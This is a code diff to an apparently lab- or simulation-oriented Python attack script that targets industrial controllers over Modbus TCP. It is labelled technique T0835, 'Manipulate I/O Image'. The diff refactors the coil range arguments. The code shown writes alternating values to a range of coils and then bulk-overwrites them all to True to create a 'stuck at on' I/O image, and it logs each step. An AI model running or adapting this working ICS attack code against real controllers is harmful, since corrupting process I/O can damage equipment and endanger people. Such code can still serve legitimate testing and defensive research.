@@ -37,8 +37,8 @@ except ImportError:
 DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
 
 # Range of coil addresses to corrupt (discrete I/O points)
-DEFAULT_START_COIL = 0
-DEFAULT_END_COIL = 19
+DEFAULT_COIL_START = 0
+DEFAULT_COIL_COUNT = 20
 
 
 def log_event(log_path: Path, event: dict):
@@ -55,7 +55,7 @@ def log_event(log_path: Path, event: dict):
 
 
 def run_manipulate_io(target: str, port: int, unit: int,
-                      start_coil: int, end_coil: int,
+                      start_coil: int, coil_count: int,
                       delay: float, log_path: Path) -> dict:
     """Write corrupted values to multiple coil addresses to corrupt the I/O image.
 
@@ -70,12 +70,12 @@ def run_manipulate_io(target: str, port: int, unit: int,
         return stats
 
     try:
-        num_coils = end_coil - start_coil + 1
+        end_coil = start_coil + coil_count - 1
         print(f"[manipulate_io] Corrupting I/O image: coils {start_coil}-{end_coil} "
-              f"({num_coils} addresses)")
+              f"({coil_count} addresses)")
 
         # Phase 1: Write each coil individually with alternating values
-        for addr in range(start_coil, end_coil + 1):
+        for addr in range(start_coil, start_coil + coil_count):
             # Alternate between True/False to create inconsistent I/O image
             value = bool((addr - start_coil) % 2)
             try:
@@ -96,14 +96,14 @@ def run_manipulate_io(target: str, port: int, unit: int,
         # the same range with all True — creates a "stuck at on" I/O image
         print(f"[manipulate_io] Bulk-overwriting coils {start_coil}-{end_coil}")
         try:
-            values = [True] * num_coils
+            values = [True] * coil_count
             result = client.write_coils(start_coil, values, slave=unit)
             if result.isError():
                 print(f"[manipulate_io] Bulk coil write error: {result}")
                 stats["errors"] += 1
             else:
-                stats["coils_written"] += num_coils
-                print(f"[manipulate_io] Bulk write successful ({num_coils} coils)")
+                stats["coils_written"] += coil_count
+                print(f"[manipulate_io] Bulk write successful ({coil_count} coils)")
         except Exception as exc:
             print(f"[manipulate_io] Bulk write exception: {exc}")
             stats["errors"] += 1
@@ -128,10 +128,10 @@ def main():
                         help="Modbus TCP port (default: 502)")
     parser.add_argument("-u", "--unit", type=int, default=1,
                         help="Modbus unit/slave ID (default: 1)")
-    parser.add_argument("--start-coil", type=int, default=DEFAULT_START_COIL,
-                        help=f"First coil address (default: {DEFAULT_START_COIL})")
-    parser.add_argument("--end-coil", type=int, default=DEFAULT_END_COIL,
-                        help=f"Last coil address (default: {DEFAULT_END_COIL})")
+    parser.add_argument("--coil-start", type=int, default=DEFAULT_COIL_START,
+                        help=f"First coil address (default: {DEFAULT_COIL_START})")
+    parser.add_argument("--coil-count", type=int, default=DEFAULT_COIL_COUNT,
+                        help=f"Number of coils to corrupt (default: {DEFAULT_COIL_COUNT})")
     parser.add_argument("-d", "--delay", type=float, default=0.05,
                         help="Delay between individual writes in seconds (default: 0.05)")
     parser.add_argument("--log", default=str(DEFAULT_LOG),
@@ -145,12 +145,12 @@ def main():
         "stage": "attack", "technique": "T0835",
         "action": "manipulate_io_start",
         "target": args.target,
-        "coil_range": f"{args.start_coil}-{args.end_coil}",
+        "coil_range": f"{args.coil_start}-{args.coil_start + args.coil_count - 1}",
     })
 
     stats = run_manipulate_io(
         args.target, args.port, args.unit,
-        args.start_coil, args.end_coil, args.delay, log_path,
+        args.coil_start, args.coil_count, args.delay, log_path,
     )
 
     log_event(log_path, {
